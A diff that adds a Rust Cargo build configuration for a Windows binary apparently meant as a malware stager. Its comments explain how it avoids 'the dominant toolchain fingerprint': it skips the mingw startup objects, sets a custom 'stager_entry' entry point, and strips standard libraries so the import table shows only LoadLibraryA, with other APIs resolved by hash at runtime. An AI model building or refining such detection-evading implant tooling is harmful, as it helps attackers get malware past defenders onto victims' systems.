@@ -1,0 +1,21 @@
+[build]
+target = "x86_64-pc-windows-gnu"
+
+[target.x86_64-pc-windows-gnu]
+rustflags = [
+    # Skip the mingw CRT startup object (crt2.o / crtexewin.o). Without this
+    # rustc would link the standard Windows subsystem entry that chains to
+    # WinMainCRTStartup/mainCRTStartup — that's the dominant toolchain
+    # fingerprint we're trying to avoid. Our custom `stager_entry` symbol
+    # becomes the PE entry point via -e.
+    "-C", "link-arg=-nostartfiles",
+    "-C", "link-arg=-estager_entry",
+    # Drop libgcc/libmingwex/libmsvcrt so the IAT contains only what we
+    # actually call from our code. Anything we need must be resolved via
+    # LoadLibraryA/GetProcAddress at runtime (see resolver.rs).
+    "-C", "link-arg=-nostdlib",
+    # kernel32 is still needed for the *single* LoadLibraryA import that
+    # bootstraps our hash resolver. We get it via -lkernel32 which mingw
+    # resolves against its .dll.a stub library.
+    "-C", "link-arg=-lkernel32",
+]
